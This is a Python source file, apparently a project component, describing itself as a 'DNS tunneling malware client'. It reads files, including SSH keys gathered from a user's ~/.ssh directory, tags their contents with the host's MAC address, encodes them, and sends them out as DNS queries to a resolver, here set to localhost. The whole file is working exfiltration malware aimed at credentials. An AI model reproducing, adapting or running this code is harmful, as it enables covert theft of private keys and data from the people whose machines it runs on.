#!/usr/bin/env python3

# Service level dependencies
import hashlib
import os
import sys
import time
from uuid import getnode as get_mac

# Constants
FILEPATH = os.path.abspath(__file__)

# Path modification for project dependencies
def parent_chain(path, n):
    for i in range(n):
        path = os.path.dirname(path)
    return path
sys.path.insert(1, parent_chain(FILEPATH, 2))

# Project level dependencies
from extractor import Extractor

from dns.resolver import Resolver
from lib.data_encoder import Encoder

my_resolver = Resolver(configure=False)
my_resolver.nameservers = ['127.0.0.1']

def send_file_to_server(encoded_file):
    results = []
    for part in encoded_file:
        query = my_resolver.query(part)
        query_result = [result.to_text() for result in query]
        results.extend(query_result)
    return results

def encode_file_contents(files, name):
    encoded_file_contents = []

    mac_address = str(get_mac())
    for file_name in files:
        with open(file_name, 'r') as f:
            timestamp = str(int(time.time()))
            contents = f.read()
            encoded_file_contents.append(
                Encoder.encode_payload(mac_address, timestamp, name, contents))
    return encoded_file_contents

def send_files_to_server(sensitive_files, server_ip):
    encoded_data = encode_file_contents(sensitive_files, "file")
    results = []
    for data in encoded_data:
        print(data)
        results.append(send_file_to_server(data))
    return results

def start():
    sensitive_files = Extractor().get_sensitive_files('/Users/coldsauce/.ssh')
    send_files_to_server(sensitive_files, '127.0.0.1')

if __name__ == '__main__':
    import argparse
    import os
    import sys

    parser = argparse.ArgumentParser(description='DNS tunneling malware client')
    parser.add_argument('files', nargs='+')
    args = parser.parse_args()
    files = [os.path.join(os.getcwd(), f) for f in args.files]
    response = send_files_to_server(files, '127.0.0.1')
    print(response)
